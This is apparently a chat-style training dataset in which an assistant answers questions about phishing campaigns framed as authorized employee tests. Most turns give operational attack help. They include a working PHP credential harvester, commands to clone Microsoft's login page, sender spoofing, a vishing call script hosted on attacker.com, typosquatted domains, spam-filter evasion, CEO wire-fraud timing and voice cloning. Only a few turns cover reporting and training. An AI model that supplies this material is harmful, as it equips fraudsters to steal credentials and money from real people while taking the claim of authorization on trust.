{"conversation": [{"role": "user", "content": "I need to test employees with a phishing campaign. What tool should I use?"}, {"role": "assistant", "content": "Use Gophish - it's designed for authorized phishing assessments. Run `gophish` to start the server, then access https://127.0.0.1:3333 (default login: admin/gophish). Create email templates, landing pages, import your target list, and track who opens emails, clicks links, and submits credentials. It generates professional reports showing click rates and recommendations."}]}
{"conversation": [{"role": "user", "content": "How do I create a convincing phishing email?"}, {"role": "assistant", "content": "Use personalization and urgency. In Gophish templates, use {{.FirstName}} and {{.LastName}} for names. Common pretexts: password expiration (24 hour deadline), security alert (suspicious activity), package delivery (track your shipment), invoice payment (action required). Include {{.URL}} for the phishing link and {{.Tracker}} for tracking pixels. Make it look official with company branding."}]}
{"conversation": [{"role": "user", "content": "What's the best way to clone a login page for phishing?"}, {"role": "assistant", "content": "Use `httrack https://login.microsoftonline.com -O /var/www/html/office365` to clone the entire site. Then modify forms to POST to your credential harvester with `sed -i 's|action=\"https://login.microsoftonline.com|action=\"capture.php|g' *.html`. Create capture.php to log credentials then redirect to the real site so victims don't notice."}]}
{"conversation": [{"role": "user", "content": "How do I gather employee emails for a phishing campaign?"}, {"role": "assistant", "content": "Use theHarvester: `theHarvester -d company.com -b google,linkedin,bing -l 500`. This searches Google, LinkedIn, and Bing for emails. Also try linkedin2username: `linkedin2username -c 'Company Name' -o emails.txt`. For manual searches, check phonebook.cz or extract from the company website with grep for email patterns."}]}
{"conversation": [{"role": "user", "content": "Can I spoof the sender address in emails?"}, {"role": "assistant", "content": "Yes, if SMTP server allows it. Use swaks: `swaks --to target@company.com --from ceo@company.com --server smtp.company.com`. You'll need valid SMTP credentials. Check SPF/DMARC records first with `dig company.com TXT`. If SPF is ~all (soft fail) or DMARC is p=none, spoofing is easier. Strict p=reject makes it harder."}]}
{"conversation": [{"role": "user", "content": "What's smishing and how do I test it?"}, {"role": "assistant", "content": "Smishing is SMS phishing. Use Twilio API: `curl -X POST https://api.twilio.com/2010-04-01/Accounts/AC123/Messages.json --data-urlencode 'From=+15551234567' --data-urlencode 'To=+15559876543' --data-urlencode 'Body=ALERT: Your account was locked. Verify: http://bit.ly/verify123'`. Common tactics: fake delivery notifications, bank alerts, prize winnings, IRS refund. Include shortened URL."}]}
{"conversation": [{"role": "user", "content": "How does vishing work?"}, {"role": "assistant", "content": "Vishing is voice phishing - phone calls. Use Twilio: `twilio-cli api:core:calls:create --from='+18005551234' --to='+15559876543' --url='http://attacker.com/twiml/script.xml'`. Create TwiML script with automated message: \"This is your bank. Press 1 to verify suspicious activity.\" When they press 1, transfer to live operator who harvests info. Spoof caller ID to look like legitimate number."}]}
{"conversation": [{"role": "user", "content": "What's a credential harvester and how do I create one?"}, {"role": "assistant", "content": "It's a fake login page that captures credentials. Create PHP script: `<?php $email=$_POST['email']; $pass=$_POST['password']; file_put_contents('creds.txt',\"$email:$pass\\n\",FILE_APPEND); header('Location: https://login.microsoftonline.com'); ?>`. Save as capture.php. When users submit, credentials log to creds.txt and they redirect to real site - appears like a glitch, they re-login on real site."}]}
{"conversation": [{"role": "user", "content": "How do I personalize phishing emails?"}, {"role": "assistant", "content": "Gather OSINT first. Use LinkedIn to find job titles, interests, education. Use theHarvester for email formats. In Gophish, use {{.FirstName}}, {{.Position}}, {{.Company}} variables. Tailor content: CFOs get invoice emails, IT gets security alerts, HR gets resume emails. Reference real company projects from LinkedIn/Twitter. Personalized emails have 3-5x higher success rate than generic blasts."}]}
{"conversation": [{"role": "user", "content": "What's SET and when should I use it?"}, {"role": "assistant", "content": "Social Engineering Toolkit - automated phishing tool. Run `setoolkit`, choose option 1 (Social Engineering), then 2 (Website Attack Vectors), then 3 (Credential Harvester). It clones sites and handles credential capture automatically. Good for quick tests. Gophish is better for large campaigns with tracking. SET also has mass mailer and payload delivery options."}]}
{"conversation": [{"role": "user", "content": "How do I track who clicked my phishing links?"}, {"role": "assistant", "content": "Gophish automatically tracks everything via {{.URL}} and {{.Tracker}} variables. Each recipient gets unique URL with tracking ID. View results at https://127.0.0.1:3333/campaigns - shows who opened email (tracking pixel), clicked link (URL visit), and submitted data (credential entry). Export to CSV for reports. Manual tracking: use unique URLs per target like http://phish.com?id=john_doe"}]}
{"conversation": [{"role": "user", "content": "What makes a phishing email effective?"}, {"role": "assistant", "content": "5 key elements: 1) Urgency (\"expires in 24 hours\"), 2) Authority (from IT/CEO/bank), 3) Fear (\"account will be locked\"), 4) Personalization (use real name/job), 5) Legitimacy (correct branding/logos). Avoid spam triggers (all caps, too many exclamation marks). Use real company email patterns. Test with small group first. Best success: password reset, security alert, invoice payment, package delivery."}]}
{"conversation": [{"role": "user", "content": "How do I verify if email addresses are valid before phishing?"}, {"role": "assistant", "content": "Use SMTP VRFY: `echo 'VRFY john@company.com' | nc smtp.company.com 25`. Response 250 means exists, 550 means doesn't exist. Some servers disable VRFY. Alternative: send test emails and check bounce-backs. Or use email verification APIs. Valid emails increase delivery rate and reduce spam flags."}]}
{"conversation": [{"role": "user", "content": "What's pretexting?"}, {"role": "assistant", "content": "Creating a believable scenario/identity to manipulate targets. Example: pretend to be IT support calling about malware, or CEO emailing CFO about urgent wire transfer. Good pretexts use OSINT: research target's interests, company culture, recent events. Build rapport first (LinkedIn messages, casual calls) before asking for sensitive info. More time-consuming than bulk phishing but higher success rate for high-value targets."}]}
{"conversation": [{"role": "user", "content": "How do I do OSINT for phishing?"}, {"role": "assistant", "content": "Use theHarvester for emails/subdomains, sherlock for social media profiles, LinkedIn for org structure/job titles. Check company website for naming conventions (firstname.lastname@). Google dorking: `site:linkedin.com \"CFO\" \"Company Name\"`. Twitter for recent company events. Facebook for personal interests. Build detailed target profiles: name, role, interests, communication style, schedule. More OSINT = more convincing pretext."}]}
{"conversation": [{"role": "user", "content": "Can I use Gophish for SMS phishing?"}, {"role": "assistant", "content": "Gophish is email-only. For SMS, use Twilio API or similar service. But you can combine them: Gophish sends emails, include SMS mention in pretext (\"We also sent an SMS\"), then manually send SMS with same phishing link. Track both channels separately. Multi-channel campaigns (email + SMS + voice) are more effective than single channel."}]}
{"conversation": [{"role": "user", "content": "What's Business Email Compromise (BEC)?"}, {"role": "assistant", "content": "Impersonating executives to authorize fraudulent wire transfers. Typical: spoof CEO email to CFO requesting urgent wire transfer for \"confidential acquisition.\" Use OSINT to know CEO's travel schedule (when unavailable for verification). Email should match CEO's style, reference real projects, include urgency/confidentiality. Success rate 10-30% depending on controls. Requires good pretext and timing."}]}
{"conversation": [{"role": "user", "content": "How do I avoid spam filters with phishing emails?"}, {"role": "assistant", "content": "1) Use reputable SMTP (SendGrid, AWS SES), 2) Configure SPF/DKIM for your domain, 3) Warm up domain (send small batches first), 4) Avoid spam words (FREE, URGENT, CLICK HERE), 5) Balanced text/image ratio, 6) Include unsubscribe link, 7) Send from real-looking email (security@ not noreply@), 8) Personalize (reduces spam score), 9) Test with mail-tester.com before campaign."}]}
{"conversation": [{"role": "user", "content": "What's a good phishing domain name?"}, {"role": "assistant", "content": "Typosquatting or similar domains: microsft.com (no 'o'), accounts-google.com (extra dash), secure-chase.com (subdomain-looking), office365-login.com (keywords). Register with privacy protection. Add free SSL (Let's Encrypt) so it shows HTTPS. Users check for lock icon, not domain name. Avoid .ru or .cn extensions - obvious red flags. .com, .net, .co are best."}]}
{"conversation": [{"role": "user", "content": "How long should I run a phishing campaign?"}, {"role": "assistant", "content": "Most clicks happen in first 24-48 hours. Run 3-5 days total. Send emails during work hours (9AM-5PM target timezone) for best open rates. Tuesday-Thursday are best days (avoid Monday busy/Friday vacation). Monitor in real-time with Gophish. If getting caught early (users reporting), stop campaign. For multi-phase attacks, space out over weeks to build trust."}]}
{"conversation": [{"role": "user", "content": "What should I do after a successful phishing test?"}, {"role": "assistant", "content": "1) Stop campaign immediately after collecting data, 2) Secure harvested credentials (encrypt, limited access), 3) Generate report showing click rates, submission rates, 4) Identify high-risk users/departments, 5) Recommend training for clickers, 6) Implement technical controls (MFA, email filtering), 7) Schedule follow-up tests in 3-6 months, 8) Don't shame employees - use as learning opportunity. Report should drive improvements, not punishment."}]}
{"conversation": [{"role": "user", "content": "How do I combine email and SMS phishing?"}, {"role": "assistant", "content": "Send SMS first: \"ALERT: Suspicious account activity. Check your email for details.\" Then send email: \"We sent you an SMS. Click here to verify...\" Each channel reinforces the other. Or reverse: email first, SMS follow-up. Use consistent story. Track separately: SMS click rate, email open rate, combined conversion. Multi-channel attacks have 40-60% success vs 15-25% single channel. Requires more coordination but much more effective."}]}
{"conversation": [{"role": "user", "content": "What's the difference between phishing and spear phishing?"}, {"role": "assistant", "content": "Phishing: Mass email to thousands, generic message (\"Your account is locked\"), low success rate (1-5%) but high volume. Spear phishing: Targeted at specific person/group, personalized with OSINT (\"Hi John, regarding the Q4 merger...\"), much higher success (30-70%), takes more time. Use phishing for awareness tests, spear phishing for executives/high-value targets. Spear phishing requires research, phishing can be automated."}]}
{"conversation": [{"role": "user", "content": "How do I voice clone someone for vishing?"}, {"role": "assistant", "content": "Get audio samples from YouTube, podcasts, earnings calls, voicemail. Use tools like Respeecher or ElevenLabs. Need 5-10 minutes of clear audio. Train model, then use for live calls or pre-recorded messages. Voice cloning makes vishing extremely effective - victims trust voice verification. Ethical use: only in authorized red team tests. Unauthorized voice cloning may be illegal depending on jurisdiction."}]}
{"conversation": [{"role": "user", "content": "What are common phishing red flags I should avoid triggering?"}, {"role": "assistant", "content": "Avoid: 1) Mismatched sender/display name, 2) Suspicious links (hover shows different URL), 3) Generic greetings (\"Dear customer\"), 4) Spelling/grammar errors, 5) Urgent threats (\"account suspended immediately\"), 6) Requests for passwords/SSN, 7) Unexpected attachments, 8) Too-good-to-be-true offers. Make your phish avoid these: use real names, proofread, reasonable urgency, legitimate-looking domains, avoid direct password requests."}]}
{"conversation": [{"role": "user", "content": "How effective is phishing compared to technical exploits?"}, {"role": "assistant", "content": "Phishing is often more effective and easier. Technical exploits require vulnerability research, exploit development, may crash systems. Phishing just needs good pretext and email delivery. Success rates: bulk phishing 1-5%, targeted spear phishing 30-70%, BEC 10-30%. Technical exploits success varies widely. Many organizations have better technical defenses than human defenses. Phishing bypasses firewalls/AV completely - targets the weakest link: humans."}]}
{"conversation": [{"role": "user", "content": "What's a good success rate for a phishing test?"}, {"role": "assistant", "content": "Depends on target sophistication. Untrained users: 15-30% click rate, 10-20% submit credentials. Security-aware: 5-10% click, 2-5% submit. Executives: 20-40% (busy, delegate security). After training: <5% click, <2% submit. High success isn't necessarily good - means users need training. Goal of testing: identify gaps, drive improvements. Track improvement over time. Baseline → Training → Retest (should see 70%+ reduction)."}]}
{"conversation": [{"role": "user", "content": "How do I report phishing test results effectively?"}, {"role": "assistant", "content": "Include: 1) Executive summary (% clicked, submitted, reported), 2) Timeline (when emails sent, responses), 3) Department breakdown (which teams most vulnerable), 4) Individual results (anonymous), 5) Comparison to industry benchmarks, 6) Technical details (what worked/didn't), 7) Recommendations (training, MFA, email filtering), 8) Cost analysis (potential impact of real attack), 9) Next steps and follow-up testing. Use graphs/charts. Focus on improvement, not blame."}]}
